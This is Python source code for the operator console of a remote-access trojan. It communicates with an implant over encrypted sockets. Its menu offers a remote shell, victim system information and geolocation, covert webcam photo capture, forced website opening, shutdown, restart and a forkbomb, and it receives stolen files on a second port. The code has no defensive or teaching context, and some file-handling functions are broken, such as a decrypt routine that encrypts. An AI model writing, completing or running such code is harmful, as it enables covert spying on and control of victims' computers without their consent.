#import libraries
import socket
import threading
import random
import time
import os
import webbrowser
import asymcrypt
from cryptography.fernet import Fernet

#variables
HOST = ""
PORT = 6168
encryption_key = b""


options = """
1.remote shell              6.shutdown
2.get pc info               7.restart
3.get pc location           8.forkbomb
4.take photo from webcam
5.open website
99.Exit
"""

#functionsasymcrypt
def clear():
    os.system("clear")
def get(size):
    cipher = Fernet(encryption_key)
    packet = cipher.decrypt(conn.recv(size)).decode()
    return packet
def put(data):
    cipher = Fernet(encryption_key)
    conn.sendall(cipher.encrypt(str(data).encode()))
def rshell():
    put("shell")
    clear()
    while True:
        UserInput = input(f"[user@{addr[0]}]:")
        if UserInput == "exit":
            put("exit")
            break
        else:
            put(UserInput)
            output = get(4016)
            print(output)
def pc_info():
    clear()
    put("pc_info")
    x = get(1024)
    print(f"Platform: {x}")
    x = get(1024)
    print(f"Machine type: {x}\n")
    tmp = input("Press ENTER to coninue:")
def pc_location():
    city = ""
    region = ""
    country = ""
    clear()
    put("pc_location")
    x = get(1024)
    print(f"Public IP: {x}")
    city = get(1024)
    print(f"City: {city}")
    region = get(1024)
    print(f"Region: {region}")
    country = get(1024)
    print(f"Country: {country}")
    x = get(1024)
    print(f"ISP: {x}")
    x = get(1024)
    print(f"Timezone: {x}\n")
    if input("Open on Google Maps?[y/n]: ") == "y":
        webbrowser.open("https://www.google.com/maps/search/"+country+"-"+region+"-"+city+"/")
    tmp = input("Press ENTER to coninue:")
def open_website():
    clear()
    put("open_website")
    x = input("Wesite URL: ")
    put(x)
def take_photo():
    clear()
    put("take_photo")
    result = get(1024)
    if result == "succes":
        getfile("result.png")
    else:
        pass
def getfile(file_name):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as nconnection:
        nconnection.bind((HOST,7127))
        nconnection.listen()
        nconn, naddr = nconnection.accept()
        with nconn:
            f = open(file_name,"wb")
            while True:
                chunk = nconn.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            f.close()
def putfile(file_name):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as nconnection:
        nconnection.bind((HOST,7127))
        nconnection.listen()
        nconn, naddr = nconnection.accept()
        with nconn:
            encryptfile(file_name,encryption_key)
            wait(1)
            with open(file_name, "rb") as f:
                while chunk := f.read(512 * 10):
                    nconn.sendall(chunk)
def getCryptKey():
    key = Fernet.generate_key()
    return(key)
def decryptfile(path,key):
    cipher = Fernet(key)

    with open(path, 'rb') as file:
        original = file.read()
    encrypted = cipher.encrypt(original)

    with open(path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
def encryptfile(path,key):
    cipher = Fernet(key)

    with open(path, 'rb') as file:
        original = file.read()
    encrypted = cipher.encrypt(original)

    with open('result.png', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
def random_string(length):
    string = ""
    for x in range(0,length):
        string = string + random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-")
    return(string)
def verify_action():
    i = random_string(5)
    print("type ",i," to verify the action")
    if input(str("")) == i:
        print("sucess")
        return 1
    else:
        time.sleep(1)
        print("WRONG CODE TRY AGAIN!")
        if input(str("")) == i:
            return 1
            print("sucess")
        else:
            print("vertification failed")
            return 0
def quit():
    put("quit")
    wait(1)
    clear()
    exit()
def restart():
    put("restart")
def shutdown():
    put("shutdown")
def wait(x):
    time.sleep(x)
def forkbomb():
    put("forkbomb")
while True:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as connection:
        connection.bind((HOST,PORT))
        connection.listen()
        conn, addr = connection.accept()

        key = conn.recv(2048)
        f = open("TohruPublicKey.pem","wb")
        f.write(key)
        f.close()
        encryption_key = getCryptKey()
        x = asymcrypt.encrypt_data(encryption_key, "TohruPublicKey.pem")
        conn.sendall(x)
        os.remove("TohruPublicKey.pem")
        time.sleep(5)
        print(f"{addr[0]} connected")

        wait(1)
        with conn:
            while  True:
                clear()
                print(options)
                UserInput = input("select a option: ")
                if UserInput == "1":
                    rshell()
                if UserInput == "2":
                    pc_info()
                if UserInput == "3":
                    pc_location()
                if UserInput == "4":
                    take_photo()
                if UserInput == "5":
                    open_website()
                if UserInput == "6":
                    shutdown()
                if UserInput == "7":
                    restart()
                if UserInput == "8":
                    forkbomb()
                if UserInput == "99":
                    quit()
